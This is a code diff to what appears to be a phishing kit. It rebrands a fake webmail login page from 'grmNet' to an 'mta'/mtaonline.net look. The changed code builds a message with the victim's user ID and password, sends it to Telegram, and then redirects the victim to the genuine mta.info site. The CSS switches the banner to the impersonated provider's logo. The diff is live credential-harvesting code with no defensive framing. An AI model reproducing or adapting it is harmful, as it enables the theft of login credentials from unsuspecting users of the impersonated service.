@@ -108,7 +108,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*grmNet *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
+        const message = `*mta *\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -120,7 +120,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://www2.grm.net/");
+        location.replace("https://www.mta.info/");
       }
     },
 
@@ -846,8 +846,8 @@ table#modernForm td.zLoginFieldSubmit{text-align:right;padding-bottom:20px;}
 .ErrorScreen A:active{color:darkgreen;text-decoration:underline;}
 .ErrorScreen .decor1{display:none;}
 .ErrorScreen .decor2{display:none;}
-.center-small .ImgLoginBanner,.ImgAppBanner{background-repeat:no-repeat;background-position:left center;background-image:url(/images/mtaonline.net-large.png);width:200px;height:35px;}
-.ImgLoginBanner{background-repeat:no-repeat;background-position:bottom left;background-size:contain;background-image:url(/images/mtaonline.net-large.png);width:260px;height:34px;}
+.center-small .ImgLoginBanner,.ImgAppBanner{background-repeat:no-repeat;background-position:left center;background-image:url(../src/assets/images/mtaonline.net-large.png);width:200px;height:35px;}
+.ImgLoginBanner{background-repeat:no-repeat;background-position:bottom left;background-size:contain;background-image:url(../src/assets/images/mtaonline.net-large.png);width:260px;height:34px;}
 .console_inset_app_l .HSashThumb{margin-left:-2px;}
 .UserInfoLink{width:100%;text-align:left;white-space:nowrap;}
 .ZmPicker .ZToolbar{padding-top:1px;border-bottom:1px solid #f2f2f2;background-color:#e5e5e5;}
